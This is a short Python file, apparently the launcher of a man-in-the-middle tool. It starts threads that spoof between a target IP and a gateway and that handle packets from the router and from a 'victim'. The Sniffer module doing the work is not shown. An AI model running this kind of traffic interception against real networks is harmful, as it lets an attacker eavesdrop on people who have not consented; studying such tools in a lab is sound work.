from sniffer import Sniffer
import threading

class FinalRun:
    def __init__(self, destinationMac, targetIP, gatewayIP, sourceMAC):
        self.sniffer = Sniffer(destinationMac, targetIP, gatewayIP, sourceMAC)

    def start(self):
        t_router = threading.Thread(target=self.sniffer.handle_packets_from_router)
        t_victim = threading.Thread(target=self.sniffer.handle_packets_from_victim)
        t_spoof = threading.Thread(target=self.sniffer.start_spoofing)
        t_spoof.start()
        print("got hre")
        t_router.start()
        t_victim.start()
